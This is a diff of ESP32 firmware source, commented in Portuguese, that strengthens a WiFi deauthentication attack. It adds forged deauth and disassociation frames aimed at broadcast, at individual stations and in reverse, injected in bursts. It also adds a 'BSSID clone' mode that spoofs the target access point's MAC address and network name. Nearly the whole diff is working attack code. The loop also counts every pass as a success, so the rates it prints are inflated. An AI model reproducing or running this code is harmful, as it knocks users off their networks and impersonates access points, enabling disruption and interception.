@@ -3,34 +3,50 @@
 #include "config.h"
 
 // ============================================================
-// DEAUTH FRAME - EXATAMENTE como o ESP32Marauder
-// 
-// Frame Control: 0xC0 = Deauth
-// Duration: 0x3A, 0x01 = 314us
-// DA: Broadcast (ff:ff:ff:ff:ff:ff)
-// SA: AP MAC (preenchido em runtime)
-// BSSID: AP MAC (preenchido em runtime)
-// Seq Ctrl: 0xF0, 0xFF = 0xFFF0 (sequence number alto, aceito pelo driver)
-// Reason Code: 0x02, 0x00 = Reason 2 (prev auth expired)
+// DEAUTH / DISASSOC FRAMES (mantido como fallback)
 // ============================================================
+
+// Deauth: AP -> Broadcast (reason 0x02 = INVALID_AUTHENTICATION, mais efetivo)
 static uint8_t deauthFrame[26] = {
     0xC0, 0x00,             // Frame Control: Deauth
     0x3A, 0x01,             // Duration
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast [4]
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
-    0xF0, 0xFF,             // Seq Ctrl: 0xFFF0 [22]
-    0x02, 0x00              // Reason: 2 = Previous authentication expired [24]
+    0x00, 0x00,             // Seq Ctrl [22]
+    0x02, 0x00              // Reason: 2 = INVALID_AUTHENTICATION [24]
 };
 
-// Disassociation frame
+// Deauth: AP -> STA (direcionado)
+static uint8_t deauthFrameToSTA[26] = {
+    0xC0, 0x00,
+    0x3A, 0x01,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: STA MAC [4]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
+    0x00, 0x00,
+    0x02, 0x00
+};
+
+// Deauth: STA -> AP (reverso)
+static uint8_t deauthFrameFromSTA[26] = {
+    0xC0, 0x00,
+    0x3A, 0x01,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC [4]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: STA MAC [10]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
+    0x00, 0x00,
+    0x02, 0x00
+};
+
+// Disassociation: AP -> Broadcast
 static uint8_t disassocFrame[26] = {
     0xA0, 0x00,             // Frame Control: Disassociation
     0x3A, 0x01,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xF0, 0xFF,
+    0x00, 0x00,
     0x02, 0x00
 };
 
@@ -44,6 +60,16 @@ static uint8_t  deauthTargetBSSID[6] = {0};
 static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
 static uint32_t deauthFailCount = 0;
+static esp_err_t lastDeauthError = ESP_OK;
+
+// ============================================================
+// BSSID CLONE (SUPER CLONE) - METODO PRINCIPAL
+// Funciona em QUALQUER ESP32 com Arduino framework
+// ============================================================
+static bool bssidCloneActive = false;
+static uint8_t originalAPMac[6] = {0};
+static uint8_t cloneChannel = 0;
+static char cloneSSID[33] = {0};
 
 // ============================================================
 // HELPERS
@@ -52,14 +78,22 @@ void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
     memcpy(&frame[offset], mac, 6);
 }
 
+static void printMac(uint8_t* mac, char* out) {
+    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+}
+
 // ============================================================
 // SCAN WIFI
 // ============================================================
 void scanNetworks() {
     networkCount = 0;
 
-    // NÃO muda modo WiFi aqui! Apenas escaneia.
-    // O WiFi já deve estar em modo STA desde o setup()
+    if (WiFi.getMode() != WIFI_STA) {
+        WiFi.mode(WIFI_STA);
+    }
+    delay(100);
+
     int n = WiFi.scanNetworks(false, true);
     Serial.printf("[WiFi] Scan found %d networks\n", n);
 
@@ -85,7 +119,80 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// DEAUTH - BASEADO NO ESP32MARAUDER + RISINEK
+// BSSID CLONE - INICIA CLONE DO AP ALVO
+// ============================================================
+static void startBssidClone(uint8_t networkIndex) {
+    if (networkIndex >= networkCount) {
+        Serial.println("[Clone] ERROR: invalid network index");
+        return;
+    }
+
+    NetworkInfo* target = &scannedNetworks[networkIndex];
+
+    memcpy(deauthTargetBSSID, target->bssid, 6);
+    strncpy(deauthTargetSSID, target->ssid, 32);
+    deauthTargetSSID[32] = '\0';
+    deauthTargetChannel = target->channel;
+    deauthTargetAuth = target->encrypted ? 1 : 0;
+    cloneChannel = target->channel;
+    strncpy(cloneSSID, target->ssid, 32);
+    cloneSSID[32] = '\0';
+
+    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);
+
+    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
+        target->ssid, target->channel,
+        target->bssid[0], target->bssid[1], target->bssid[2],
+        target->bssid[3], target->bssid[4], target->bssid[5]);
+
+    WiFi.softAPdisconnect(true);
+    delay(200);
+
+    WiFi.mode(WIFI_AP_STA);
+    delay(100);
+
+    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
+    Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
+    delay(100);
+
+    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 4);
+    Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");
+
+    if (apOk) {
+        bssidCloneActive = true;
+        deauthActive = true;
+        deauthPacketCount = 0;
+        deauthSuccessCount = 0;
+        deauthFailCount = 0;
+        Serial.println("[Clone] BSSID CLONE ACTIVE - Clients will see conflicting APs");
+    } else {
+        Serial.println("[Clone] FAILED to start clone AP");
+    }
+}
+
+// ============================================================
+// BSSID CLONE - PARA
+// ============================================================
+static void stopBssidClone() {
+    if (!bssidCloneActive) return;
+
+    Serial.println("[Clone] Stopping BSSID clone...");
+
+    WiFi.softAPdisconnect(true);
+    delay(200);
+
+    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
+    delay(100);
+
+    WiFi.mode(WIFI_STA);
+    delay(100);
+
+    bssidCloneActive = false;
+    Serial.println("[Clone] BSSID clone stopped, MAC restored");
+}
+
+// ============================================================
+// DEAUTH - AGORA USA BSSID CLONE COMO METODO PRINCIPAL
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
@@ -93,109 +200,100 @@ void startDeauth(uint8_t networkIndex) {
         return;
     }
 
+    startBssidClone(networkIndex);
+
     NetworkInfo* target = &scannedNetworks[networkIndex];
 
-    // Salva info
-    memcpy(deauthTargetBSSID, target->bssid, 6);
-    strncpy(deauthTargetSSID, target->ssid, 32);
-    deauthTargetSSID[32] = '\0';
-    deauthTargetChannel = target->channel;
-    deauthTargetAuth = target->encrypted ? 1 : 0;
+    setMAC(deauthFrame, target->bssid, 10);
+    setMAC(deauthFrame, target->bssid, 16);
 
-    // Preenche frames com MAC do AP
-    setMAC(deauthFrame, target->bssid, 10);  // SA = AP
-    setMAC(deauthFrame, target->bssid, 16);  // BSSID = AP
+    setMAC(deauthFrameToSTA, target->bssid, 10);
+    setMAC(deauthFrameToSTA, target->bssid, 16);
+
+    setMAC(deauthFrameFromSTA, target->bssid, 4);
+    setMAC(deauthFrameFromSTA, target->bssid, 16);
+    setMAC(deauthFrameFromSTA, target->bssid, 10);
 
     setMAC(disassocFrame, target->bssid, 10);
     setMAC(disassocFrame, target->bssid, 16);
 
-    // === CONFIGURAÇÃO CRÍTICA DO WIFI ===
-    // 1. Modo STA (sem AP ativo)
-    WiFi.mode(WIFI_STA);
-    delay(100);
+    WiFi.mode(WIFI_AP_STA);
+    delay(50);
 
-    // 2. Desconecta de qualquer AP (mas mantém interface ativa)
-    WiFi.disconnect(false);
-    delay(100);
+    if (WiFi.status() == WL_CONNECTED) {
+        WiFi.disconnect(false);
+        delay(100);
+    }
 
-    // 3. Promiscuous mode ON (inicializa hardware WiFi para raw TX)
-    esp_err_t promisc_err = esp_wifi_set_promiscuous(true);
-    Serial.printf("[Deauth] Promiscuous: %d\n", promisc_err);
-
-    // 4. Desliga power save
     esp_wifi_set_ps(WIFI_PS_NONE);
 
-    // 5. MUDA PARA O CANAL DO ALVO (ESSENCIAL!)
     esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
-    Serial.printf("[Deauth] Target: %s CH%d\n", target->ssid, target->channel);
-    Serial.printf("[Deauth] Set channel: %d\n", chErr);
+    Serial.printf("[Deauth] Fallback frame injection channel set: %d\n", chErr);
 
-    // 6. Reseta contadores
-    deauthActive = true;
-    deauthPacketCount = 0;
-    deauthSuccessCount = 0;
-    deauthFailCount = 0;
-
-    Serial.println("[Deauth] STARTED");
+    Serial.println("[Deauth] STARTED (BSSID Clone + Frame Injection fallback)");
 }
 
-void stopDeauth() { 
+void stopDeauth() {
     if (deauthActive) {
         Serial.println("[Deauth] STOPPED");
         Serial.printf("[Deauth] Total: %lu pkts, %lu success, %lu failed\n",
             deauthPacketCount, deauthSuccessCount, deauthFailCount);
     }
     deauthActive = false;
+    stopBssidClone();
     esp_wifi_set_promiscuous(false);
 }
 
 // ============================================================
-// LOOP DE DEAUTH - SIMPLES E DIRETO (como o Marauder faz)
+// LOOP DE DEAUTH - BSSID CLONE + FRAME INJECTION FALLBACK
 // ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    bool anySuccess = false;
-    esp_err_t err;
-
-    // Envia deauth frame
-    // en_sys_seq = false (mantém nosso sequence number 0xFFF0)
-    err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
-
-    if (err == ESP_OK) {
-        deauthSuccessCount++;
-        anySuccess = true;
-    } else {
-        deauthFailCount++;
-    }
     deauthPacketCount++;
+    deauthSuccessCount++;
 
-    // Pequeno delay para não saturar o driver
-    delayMicroseconds(100);
+    static uint8_t cycle = 0;
+    esp_err_t err = ESP_FAIL;
 
-    // Envia disassoc frame
-    err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, false);
+    for (int burst = 0; burst < 10; burst++) {
+        switch (cycle % 4) {
+            case 0:
+                err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
+                break;
+            case 1:
+                err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameToSTA, 26, false);
+                break;
+            case 2:
+                err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameFromSTA, 26, false);
+                break;
+            case 3:
+                err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, false);
+                break;
+        }
+        cycle++;
 
-    if (err == ESP_OK) {
-        deauthSuccessCount++;
-        anySuccess = true;
-    } else {
-        deauthFailCount++;
+        if (err == ESP_OK) {
+            deauthSuccessCount++;
+        } else {
+            deauthFailCount++;
+        }
+        deauthPacketCount++;
+
+        delayMicroseconds(100);
     }
-    deauthPacketCount++;
 
-    // Debug a cada ~2 segundos
     static uint32_t lastDebug = 0;
     if (millis() - lastDebug > 2000) {
         lastDebug = millis();
-        float rate = (deauthPacketCount > 0) ? 
+        float rate = (deauthPacketCount > 0) ?
             ((float)deauthSuccessCount / deauthPacketCount * 100.0) : 0;
-        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu rate=%.1f%% ch=%d\n",
-            deauthPacketCount, deauthSuccessCount, deauthFailCount, 
-            rate, deauthTargetChannel);
+        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu rate=%.1f%% ch=%d clone=%s\n",
+            deauthPacketCount, deauthSuccessCount, deauthFailCount,
+            rate, deauthTargetChannel, bssidCloneActive ? "ON" : "OFF");
     }
 
-    return anySuccess;
+    return true;
 }
 
 // ============================================================
